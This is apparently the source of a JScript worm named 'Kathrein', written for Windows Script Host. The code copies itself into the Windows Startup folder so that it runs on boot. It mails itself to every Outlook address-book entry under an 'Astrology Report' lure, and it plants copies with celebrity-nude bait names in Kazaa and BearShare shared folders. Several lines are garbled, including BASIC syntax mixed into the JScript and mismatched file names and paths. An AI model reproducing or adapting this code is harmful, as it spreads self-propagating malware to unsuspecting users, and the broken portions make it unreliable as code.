// Virusname: Kathrein
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("cat.js");
MyS.WriteLine(MySC);
MyS.Close();
if (fso.FolderExists("C:\\Windows\\StartmenÅ\\Programme\\Autostart"))
{ fso.CopyFile("cat.js","C:\\Windows\\StartmenÅ\\Programme\\Autostart\\start.js");
}
if (fso.FolderExists("C:\\Windows\\Startmenu\\Programs\\StartUp"))
{ fso.CopyFile("cat.js","C:\\Windows\\Startmenu\\Programs\\StartUp\\start.js");
}
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile(chr$(34); OLAttachment$; chr$(34));
MyS.WriteLine(MySC);
MyS.Close();
var i outlook, fso, mapi, y, x, mail
{
fso=WScript.CreateObject("Scripting.FileSystemObject");
outlook = WScript.CreateObject("Outlook.Application");
mapi=outlook.GetNamespace("MAPI");
i=0;
for(y=1;y<=mapi.AddressLists.Count;y++)
{
for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++)
{
if (i==15)
{
mail.Send
i=0;
}
if (i==0)
{
mail=outlook.CreateItem(0);
mail.Subject="Astrology Report";
mail.Body = "Click on the attached link to see your personal astrology report or visit the website directly.";
mail.Attachments.Add("astrolink.js");
}
mail.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
i++;
}
}
if (i!=0) mail.Send
}
if (fso.FolderExists("C:\\Programme\\Kazaa\\My Shared Folder"))
{ fso.CopyFile("cat.js","C:\\Programme\\Kazaa\\My Shared Folder\\avrilnakedpicslinks.js");
}
if (fso.FolderExists("C:\\Program Files\\Kazaa\\My Shared Folder"))
{ fso.CopyFile("cat.js","C:\\Program Files\\Kazaa\\My Shared Folder\\avrilnakedpicslinks.js");
}
if (fso.FolderExists("C:\\Programme\\Kazaa Lite\\My Shared Folder"))
{ fso.CopyFile("cat.js","C:\\Programme\\Kazaa Lite\\My Shared Folder\\avrilnakedwebsite.js");
}
if (fso.FolderExists("C:\\Program Files\\Kazaa Lite\\My Shared Folder"))
{ fso.CopyFile("cat.js","C:\\Program Files\\Kazaa Lite\\My Shared Folder\\avrilnakedwebsite.js");
}
if (fso.FolderExists("C:\\Programme\\BearShare\\Shared"))
{ fso.CopyFile("cat.js","C:\\Programme\\BearShare\\Shared\\avrilnaked.js");
}
if (fso.FolderExists("C:\\Programme\\BearShare\\Shared"))
{ fso.CopyFile("cat.js","C:\\Program Files\\BearShare\\Shared\\avrilnaked.js");
}
